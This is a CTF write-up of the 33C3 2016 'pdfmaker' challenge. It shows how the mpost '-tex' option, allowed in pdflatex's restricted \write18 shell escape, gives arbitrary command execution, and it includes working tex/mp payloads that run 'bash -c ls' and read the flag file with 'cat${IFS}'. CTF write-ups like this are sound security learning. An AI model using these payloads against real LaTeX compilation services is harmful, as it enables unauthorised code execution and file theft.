---
layout: post
title: "33C3 CTF 2016: pdfmaker write-up"
date: 2017-02-20 02:21:38 +0000
categories:
    - CTF
description: "Write-up of 33C3 CTF 2016: pdfmaker."
keywords: 33c3, 33c3 ctf, pdflatex, tex, write-up
redirect_from: /p/20170220/
---

## pdfmaker (misc 75)

> Just a tiny
> [application](https://archive.aachen.ccc.de/33c3ctf.ccc.ac/uploads/pdfmaker-023c4ad945cb421a8bec1013bddf2bab5f77f77a.tar.xz),
> that lets the user write some files and compile them with pdflatex. What can
> possibly go wrong?
>
> `nc 78.46.224.91 24242`

If you can't download the application, please use this
[link](/downloads/2017/02/20/pdfmaker-023c4ad945cb421a8bec1013bddf2bab5f77f77a.tar.xz).

## What is the goal?

There are some interesting parts in `pdfmaker_public.py`. `initConnection`
copies `flag` file into the `self.directory` with the name of:

``` python
"33C3" + "%X" % randint(0, 2**31) + "%X" % randint(0, 2**31)
```

Since the answer would be in the `33C3XXXXXXXXXXXXXXXX` file, we should get the
list of filenames in its directory. Note that `create` method can create log,
tex, sty, mp, bib files.

## Behavior of `\write18`

[@daehee](http://gsis.kaist.ac.kr/cysec/daeheejang.html) found this helpful
link:
["Pwning coworkers thanks to LaTeX"](http://scumjr.github.io/2016/11/28/pwning-coworkers-thanks-to-latex/).
According to the post, `\write18` normally executes any program listed in
`shell_escape_commands`:

``` conf
shell_escape_commands = \
bibtex,bibtex8,\
extractbb,\
kpsewhich,\
makeindex,\
mpost,\
repstopdf,\
```

Note that `mpost` is in there, and we can create mp file! As denoted by the
link, `mpost` takes the `-tex` option for text labels, so we can execute
arbitrary program.

<!-- more -->

## Exploitation

I'll explain the exploitation step by step.

At first, we create a tex file that executes `mpost` on compilation. Note that
we specified `bash -c ls>c.log` to the `-tex` option.

```
> create tex x
\documentclass{article}\begin{document}
\immediate\write18{mpost -ini "-tex=bash -c ls>c.log" "x.mp"}
\end{document}
\q
```

Now we create a mp file.

```
> create mp x
verbatimtex
\documentclass{minimal}\begin{document}
etex beginfig (1) label(btex blah etex, origin);
endfig; \end{document} bye
\q
```

Then compile the previous tex file to invoke the `ls` command.

```
> compile x
```

Then we get the list of filename in the directory.

```
> show log c
33C3566BA1153C636C68
c.log
makempx.log
mpxxZmwh.tex
x.aux
x.log
x.mp
x.tex
```

We have to read the content of `33C3566BA1153C636C68` file, so let's create one
more tex file. `bash -c (cat${IFS}33C3566BA1153C636C68)>d.log` will be executed
on compilation.

```
> create tex y
\documentclass{article}\begin{document}
\immediate\write18{mpost -ini "-tex=bash -c (cat${IFS}33C3566BA1153C636C68)>d.log" "x.mp"}
\end{document}
\q
```

Then compile it.

```
> compile y
```

So we can read the log.

```
> show log d
33C3_pdflatex_1s_t0t4lly_s3cur3!
```

So the flag is `33C3_pdflatex_1s_t0t4lly_s3cur3!`.
